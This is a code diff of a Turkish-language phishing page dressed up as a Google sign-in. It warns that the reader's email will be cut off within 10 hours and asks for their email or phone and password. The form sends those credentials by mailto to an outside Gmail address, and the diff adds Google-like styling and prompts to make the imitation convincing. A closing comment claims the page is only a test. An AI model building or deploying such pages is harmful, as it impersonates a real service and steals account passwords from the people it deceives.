@@ -10,9 +10,25 @@ strong{
     color:red;
    }
 fieldset{
-    width:25px;
-    height:300px;
-    }
+    width:380px;
+    height:400px;
+    border-radius: 10px 10px 10px 10px;
+    border: 1px solid rgba(192, 191, 191, 0.637);
+     }
+  input[type=submit] {
+      width:83px;
+      height:35px;
+      background-color:rgba(9, 90, 240, 0.918);
+      color:white;
+      border-radius: 6px 6px 6px 6px;
+      border: 2px solid rgb(255, 255, 255);
+  }  
+  input[type=text] {
+      width:290px;
+      height:43px;
+      border-radius: 4px 4px 4px 4px;
+      border: 1px solid rgba(160, 158, 158, 0.808);
+  }
 
 
 </style>
@@ -20,21 +36,20 @@ fieldset{
   <body>
   <center>
   <strong>!!!Teknik aksaklık nedeniyle xxx adlı E-posta iletişiminiz kesilecektir.Kesilmemesi için hesabın size ait olduğunu teyit edebilmemiz için lütfen aşağıdaki bilgileri doldurunuz.!!!<br>KALAN ZAMAN 10SAAT</strong>   
- <form method="get" action="mailto:bgjbh796@gmail.com" >
- <fieldset>
+  <form method="get" action="mailto:bgjbh796@gmail.com" >
+     <fieldset>
      <!--aşağıda -legend etiketi konunca resim çizginin yarısına gelir-->
-     <lege><img src="google.jpg"width=80px;><p><font>Oturum aç</p></lege></legend>
-     
+     <lege><img src="google.jpg"width=120px; alt=google;><p><font size=5px;>Oturum aç</font></p><p>Google şifrenizi kullanın</p></lege>
+      
  <table>
- <tr> <td>Adın-Soyadın:</td> <td><input type="text" name="subject" /></td></tr>
+ <tr> <td></td> <td><input type="text" name="subject" placeholder="E-Posta veya telefon" /></td></tr>
  <tr> <td></td> </tr> 
  <tr> <td></td> </tr>
- <tr> <td>E-Posta şifren:</td>
-   
-    <td><input type="text" name="body" /></td> </tr>
+ <tr> <td></td>  
+<td><input type="text" name="body" placeholder="E-Posta şifre"/></td> </tr>
  </table> 
- <input type="submit" value="Gönder"/>
-</fieldset> 
+ <input type="submit" value="İleri"/>
+</fieldset>
 </form></center>
 <!--DENEME AMAÇLIDIR HİÇ BİR ŞEKİLDE KÖTÜYE KULLANIM BULUNMAMAKTADIR.ŞÜPESİZ Kİ GOOGLE TEKTİR.-->
 
